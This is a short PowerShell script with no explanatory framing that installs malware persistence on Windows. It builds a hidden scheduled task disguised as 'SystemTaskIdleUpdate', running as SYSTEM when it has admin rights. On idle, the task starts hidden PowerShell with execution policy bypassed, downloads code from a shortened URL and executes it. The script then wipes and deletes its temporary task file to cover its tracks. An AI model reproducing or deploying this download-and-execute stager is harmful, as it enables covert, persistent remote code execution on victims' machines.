#
# One task when idle
#

$task      = 'http://goo.gl/MTekjk';
$adminTask = 'http://goo.gl/MTekjk';
$taskName  = 'SystemTaskIdleUpdate';

$isAdmin = (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"));
$userId = 'S-1-5-18';
If (-NOT $isAdmin){
  $computername=$env:userdomain; if([string]::IsNullOrEmpty($computername)){$computername = $env:computername;};      
  $userId = $computername+'\'+$env:username;
}
else{
  $task = $adminTask;
}

#
#$taskName [\ru System]
#

$f=$env:TEMP;$f+='\'+$taskName+'.xml';
$s = '<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2010-10-16T16:09:29</Date>
    <Author>';
$s+=$env:username+'</Author>
  </RegistrationInfo>
  <Triggers>
    <IdleTrigger>
      <Enabled>true</Enabled>
    </IdleTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>';   
$s+=$userId+'</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT15M</Duration>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>true</RestartOnIdle>
      <WaitTimeout>PT0S</WaitTimeout>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>true</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT8H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell</Command>';
$s+="<Arguments>-nop -ep bypass -w hidden -c iex(New-Object Net.WebClient).DownloadString('"+$task+"')</Arguments>";
$s+='</Exec>
  </Actions>
</Task>';

$s > $f;

If ($isAdmin){
  schtasks.exe /Create /XML $env:TEMP"\"$taskName".xml" /tn $taskName /ru System;
}
else{
  schtasks.exe /Create /XML $env:TEMP"\"$taskName".xml" /tn $taskName;
}

$s = '';
$s > $f;

#
#destruct disk file
#

del $env:TEMP"\"$taskName".xml";

